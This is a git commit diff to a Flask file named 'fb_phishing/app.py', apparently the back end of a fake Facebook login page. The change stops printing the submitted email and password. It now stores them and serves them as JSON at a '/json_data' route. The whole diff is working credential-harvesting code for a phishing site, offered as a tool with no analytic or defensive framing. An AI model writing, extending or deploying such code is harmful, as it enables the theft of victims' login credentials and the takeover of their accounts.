6db3ee5a33314b801a524315e66c583b59b273bb
Najaf Ali <65591681+najafali14@users.noreply.github.com>
2024-12-02 22:54:33 +0500

    Update app.py

--- fb_phishing/app.py
+++ fb_phishing/app.py
@@ -1,10 +1,20 @@
-from flask import Flask,render_template,request
+from flask import Flask, render_template, request, jsonify
+
 app = Flask(__name__)
-@app.route('/',methods=["POST","GET"])
+
+@app.route('/', methods=["POST", "GET"])
 def Index():
-  email = request.form.get("email")
-  password = request.form.get("password")
-  print(email,password)
-  return render_template("index.html")
+    email = request.form.get("email")
+    password = request.form.get("password")
+    global details1
+    details1 = {"Email": email, "Password": password}  # Save details1 for use in other routes
+    return render_template("index.html")
+
+
+@app.route("/json_data")
+def json_data():
+    # Return details1 as JSON response
+    return jsonify(details1)
+
 if __name__ == "__main__":
-  app.run(debug=True)
+    app.run(debug=True)
